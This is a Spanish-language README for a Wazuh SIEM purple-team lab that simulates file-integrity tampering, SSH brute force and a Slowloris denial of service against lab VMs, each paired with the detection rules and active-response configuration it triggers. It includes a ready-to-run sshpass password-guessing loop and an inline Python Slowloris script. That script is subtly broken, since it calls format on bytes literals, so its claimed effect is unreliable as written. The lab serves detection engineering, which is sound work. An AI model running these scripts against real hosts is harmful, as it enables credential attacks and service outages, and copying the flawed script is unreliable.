<div align="center">

# Wazuh SIEM & Detection Engineering Lab
### *Purple Team Incident Simulation & Active Defense Automated Pipeline*

![Wazuh](https://img.shields.io/badge/Wazuh-v4.10.4--1-00599C?style=for-the-badge&logo=wazuh&logoColor=white)
![Ansible](https://img.shields.io/badge/Ansible-Automation-EE0000?style=for-the-badge&logo=ansible&logoColor=white)
![Vagrant](https://img.shields.io/badge/Vagrant-IaC-1563FF?style=for-the-badge&logo=vagrant&logoColor=white)
![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-Mapped-FF6F00?style=for-the-badge)

<p align="center">
  <b>Infraestructura como Código (IaC)</b> para despliegue automatizado de un clúster <b>Wazuh SIEM/XDR</b>,<br>
  validación de detección de amenazas en tiempo real y ejecución de contramedidas automáticas.
</p>

---

</div>

## Tabla de Contenidos
- [Arquitectura del Entorno](#-arquitectura-del-entorno)
- [Despliegue y Acceso](#-despliegue-y-acceso)
- [Escenarios de Seguridad (Purple Teaming)](#-escenarios-de-seguridad-purple-teaming)
  - [1. File Integrity Monitoring (FIM)](#1-monitoreo-de-integridad-de-archivos-fim--syscheck)
  - [2. Detección y Mitigación de Fuerza Bruta SSH](#2-detección-y-mitigación-de-fuerza-bruta-ssh-active-response)
  - [3. Agotamiento de Recursos / DoS L7 (Slowloris)](#3-denegación-de-servicio-capa-7-slowloris)
- [Monitoreo y Dashboards](#-monitoreo-y-dashboards)
- [Stack Tecnológico](#-stack-tecnológico)

---

## 🏛️ Arquitectura del Entorno

```text
       +-------------------------------------------------------------+
       |                         Host Network                        |
       |                   (Fedora Workstation / Local)              |
       +-------------------------------------------------------------+
                                      |
                      +---------------+---------------+
                      | (Port 8443)                   | (Port 22/80)
                      v                               v
       +-----------------------------+ +-----------------------------+
       |   wazuh-server (Manager)    | |   wazuh-agent-01 (Target)   |
       |   IP: 192.168.121.26        | |   IP: 192.168.121.104       |
       |                             | |                             |
       |  • Wazuh Manager v4.10.4-1  | |  • Wazuh Agent v4.10.4-1    |
       |  • Wazuh Indexer            | |  • OpenSSH Daemon           |
       |  • Wazuh Dashboard          | |  • Apache2 HTTP Server      |
       +-----------------------------+ +-----------------------------+
                      ^                               |
                      |==== Logs & Telemetry (1514) ==|
                      |==== Active Response Sync =====|

| Componente | Hostname | IP Asignada | Rol / Servicios |
| :--- | :--- | :--- | :--- |
| **SIEM Server** | `wazuh-server` | `192.168.121.26` | Wazuh Manager, Indexer, Dashboard (`:8443`) |
| **Endpoint Objetivo** | `wazuh-agent-01` | `192.168.121.104` | Wazuh Agent, Syscheck, OpenSSH, Apache2 |
| **Host Atacante** | `localhost` | Subred Local | Emisor de tráfico de prueba / scripts |




## Despliegue y Acceso

1. Provisionar Infraestructura con Vagrant y Ansible

vagrant up

2. Acceso al Dashboard de Wazuh

    URL: https://localhost:8443 (o https://192.168.121.26:443)

    Usuario: admin

    Contraseña: (Generada en el despliegue del cluster/Indexer)

 Escenarios de Seguridad (Purple Teaming)

    Aviso de Responsabilidad Ética: Todas las pruebas y scripts incluidos fueron diseñados y ejecutados exclusivamente dentro de un entorno de red de laboratorio aislado con fines didácticos y de ingeniería de detección.

1. Monitoreo de Integridad de Archivos (FIM / Syscheck)

Demostración de detección ante la creación de binarios no autorizados y escalamiento permisivo de privilegios en rutas sensibles del sistema.

    Mapeo MITRE ATT&CK:

        Táctica: Persistence (TA0003) / Defense Evasion (TA0005)

        Técnica: File and Directory Permissions Modification (T1222)


## Simulación del Evento
# Crear un binario sospechoso y asignarle permisos 777 en el agente
vagrant ssh wazuh-agent-01 -c "sudo touch /bin/wazuh_test_backdoor && sudo chmod 777 /bin/wazuh_test_backdoor"

# Forzar escaneo inmediato de Syscheck desde el Manager
vagrant ssh wazuh-server -c "sudo /var/ossec/bin/agent_control -r -u 001"

#### 🔹 Reglas Disparadas y Telemetría
* **Rule ID `554` (Level 5):** `File added to the system.`
* **Rule ID `550` (Level 7):** `Integrity checksum changed.`
* **Metadatos recolectados:** Cálculo automático de hashes (MD5, SHA1, SHA256), permisos POSIX (`-rwxrwxrwx`) y usuario ejecutor (`root`).

---

### 2. Detección y Mitigación de Fuerza Bruta SSH (Active Response)

Simulación de un ataque de diccionario automatizado contra el servicio OpenSSH y respuesta activa inmediata bloqueando la IP origen a nivel de firewall.

* **Mapeo MITRE ATT&CK:**
  * **Táctica:** `Credential Access` (TA0006) / `Initial Access` (TA0001)
  * **Técnica:** `Brute Force: Password Guessing` (T1110.001) / `Remote Services: SSH` (T1021.004)

#### 🔸 Simulación del Ataque
Ejecutar ráfaga de intentos fallidos desde la terminal del host atacante:

```bash
for i in {1..8}; do 
  sshpass -p "ClaveFalsa123" ssh -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null -o ConnectTimeout=2 \
  fakeuser@192.168.121.104 2>/dev/null
done


 Detección y Correlación

    Rule ID 5710 (Level 5): sshd: Attempt to login using a non-existent user.

    Rule ID 5712 (Level 10 - Correlación): sshd: Brute force trying to get access to the system.

 Configuración de Respuesta Activa (ossec.conf)

En el archivo /var/ossec/etc/ossec.conf del Manager:

```xml
<active-response>
  <command>firewall-drop</command>
  <location>local</location>
  <rules_id>5712</rules_id>
  <timeout>60</timeout>
</active-response>
```

> **Resultado:** Al dispararse la regla `5712`, el agente ejecuta automáticamente una regla `iptables`/`nftables` que descarta (`DROP`) todo paquete proveniente de la IP atacante durante un periodo de 60 segundos.

### 3. Denegación de Servicio Capa 7 (Slowloris)
Demostración de cómo un ataque de retención lenta de sockets HTTP puede degradar por completo la disponibilidad de un servicio web sin necesidad de gran ancho de banda.

- **Mapeo MITRE ATT&CK:**

- **Táctica:** `Impact` (TA0040)
- **Técnica:** `Endpoint Denial of Service: Application Exhaustion Flood` (T1499.003)

#### 🔸 Preparación y Ataque

1. Instalar y levantar Apache2 en el agente:
Bash

```bash
vagrant ssh wazuh-agent-01 -c "sudo apt-get update && sudo apt-get install -y apache2 && sudo systemctl enable --now apache2"
```

1. Lanzar script de agotamiento de workers desde el Host:
Bash

```bash
python3 -c "
import socket, time
sockets = []
target_ip = '192.168.121.104'
target_port = 80
for i in range(200):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target_ip, target_port))
        s.send(b'GET /?{} HTTP/1.1\r\n'.format(i).encode('utf-8'))
        s.send(b'User-Agent: Mozilla/5.0 (Slowloris-Test)\r\n')
        sockets.append(s)
    except Exception:
        break
while True:
    for s in list(sockets):
        try:
            s.send(b'X-a: {}\r\n'.format(time.time()).encode('utf-8'))
        except Exception:
            sockets.remove(s)
    time.sleep(10)
"
```

#### 🔹 Evidencia de Detección e Impacto

- **Impacto en cliente legítimo:** `curl -m 3 -I http://192.168.121.104` devuelve error de `Connection timed out`.
- **Telemetría en logs:** `/var/log/apache2/error.log` registra `server reached MaxRequestWorkers setting`, indexado en el grupo `rule.groups: "apache"`.

## 📊 Monitoreo y Dashboards

| Módulo | Ruta en Wazuh Dashboard | Filtro DQL Recomendado |
| :--- | :--- | :--- |
| **File Integrity (FIM)** | `Endpoint Security` > `File Integrity Monitoring` | `rule.groups: "syscheck"` |
| **SSH Threats** | `Threat Intelligence` > `Threat Hunting` | `rule.groups: "sshd"` |
| **Web Server Events** | `Threat Intelligence` > `Threat Hunting` | `rule.groups: "apache"` |
| **Compliance & Hardening** | `Endpoint Security` > `Configuration Assessment` | Inspección de agente `001` (CIS Benchmarks) |

## 🛠️ Stack Tecnológico

- **SIEM / XDR:** Wazuh Manager, Indexer & Dashboard `4.10.4-1`
- **Infraestructura como Código:** Vagrant, Ansible
- **Virtualización / Hypervisor:** QEMU/KVM, Libvirt
- **Sistemas Operativos:** Debian / Ubuntu (VMs), Fedora Linux (Host)
- **Defensa Perimetral Host:** Netfilter / Iptables integrados vía Wazuh AR

